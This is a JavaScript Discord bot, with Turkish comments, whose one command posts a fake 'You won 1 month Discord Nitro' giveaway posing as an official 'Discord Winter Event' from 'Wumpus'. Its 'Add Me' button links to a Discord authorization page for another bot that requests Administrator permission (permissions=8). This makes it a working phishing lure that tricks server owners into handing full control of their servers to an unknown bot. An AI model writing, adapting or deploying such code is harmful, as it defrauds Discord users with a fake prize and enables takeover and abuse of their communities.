const { Client, Intents, MessageEmbed, MessageActionRow, MessageButton } = require('discord.js');
const client = new Client({
    intents: [
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_MESSAGES,
        Intents.FLAGS.MESSAGE_CONTENT,
        Intents.FLAGS.GUILD_MEMBERS,
    ],
});

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    if (message.content === '!embed') {
        // Embed mesajını oluşturuyoruz
        const embed = new MessageEmbed()
            .setTitle('🎁  | Redeem your 1 month of Discord Nitro!')
            .setDescription('🔃   | Hey there! I\'m **Wumpus**, a Discord Bot gifting awesome free prizes such as **Discord Nitro subscription** for adding me to your server!\n\n> <:WhiteGift:1347326372615422094> | To be able to receive your prize, you must follow the requirements below!\n\n> `1.` Click **Add me** to your server\n> `2.` Server must have at least `10+ members` & **have an activity**\n> `3.` After finished your **gift link** will be sent via **DMs** shortly!')
            .setColor('5b5bff')
            .setFooter("© Discord Winter Event")
            .setThumbnail("https://cdn.discordapp.com/attachments/1347149052009123865/1347244192786681917/1268867386576994347.gif?ex=67cb1e6e&is=67c9ccee&hm=26fafcdc9e5de1f0849a4cbdf515698caca31135c9d4308b17ba2247a25f4d66&")
            .setImage("https://cdn.discordapp.com/attachments/1215224001400545351/1399457995443671120/319297.jpg?ex=68a21ed2&is=68a0cd52&hm=0d37749ad51ee862a905b84a989e8bf8215e73bb4da81a775df48e79425c82f6&");

        // Buton oluşturuyoruz
        const button = new MessageButton()
            .setLabel('Add Me')
	    .setEmoji('1364075075598417952')
            .setStyle('LINK')
            .setURL('https://discord.com/oauth2/authorize?client_id=1245686536054247446&permissions=8&integration_type=0&scope=bot');

        // Butonu içeren bir satır (row) oluşturuyoruz
        const row = new MessageActionRow().addComponents(button);

        try {
            // Embed ve butonları kanala gönderiyoruz
            await message.channel.send({
                content: `**You won 1 month Discord nitro!**`,
                embeds: [embed],
                components: [row],
            });
            console.log('Embed with button sent!');
        } catch (error) {
            console.error('Error sending embed with button:', error);
            message.reply('There was an error sending the embed with the button.');
        }
    }
});


client.login(process.env.token);  // Buraya botunuzun token'ını girin


